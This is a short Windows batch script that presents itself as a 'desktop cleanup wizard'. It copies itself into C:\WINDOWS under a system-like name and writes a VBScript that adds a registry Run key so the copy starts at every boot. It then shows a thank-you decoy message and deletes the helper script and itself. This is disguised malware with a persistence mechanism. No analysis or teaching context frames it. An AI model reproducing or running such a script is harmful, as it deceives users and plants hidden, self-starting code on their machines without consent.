ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >> "sysconfig.vbs"
ECHO WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\sysconfig", "C:\WINDOWS\sysconfigs.bat", "REG_SZ" >> "sysconfig.vbs"
Copy %0 "C:\WINDOWS\sysconfigs.bat"
start sysconfig.vbs
pause
cls
echo Thank you for using this desktop cleanup wizard... :-)
del sysconfig.vbs
del %0

